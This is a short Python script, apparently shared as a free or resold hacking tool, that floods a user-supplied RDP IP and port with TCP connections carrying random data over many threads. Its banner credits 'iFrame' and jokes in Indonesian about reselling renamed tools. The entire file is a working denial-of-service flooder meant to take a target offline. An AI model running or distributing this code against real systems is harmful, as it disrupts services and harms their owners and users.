# Coding Time By iFrame
# Tools Usage By : iFrame
# Tools Credit By : iFrame
# Don't Leak Your Tools Now !!!

# Import Module
import random
import socket
import threading
import os
# Info Tools [ XC Tools ]
os.system("clear")

print("--------------------------------------")
print("[+] Tools Used By : iFrameStore")
print("[+] Credit Tools : FREE TOOLS ")
print("[+] Ini tools orang ku rename :)")
print("[+] terus ku jual /omg")
print("[+] aku juga suka jual tuls temen :)")
print("[+] iFrame Suka Nyepong ")
print("---------------------------------------")

ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80/3389)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (1000) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By iFrame Tools DDoS Auto Suspend IP => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()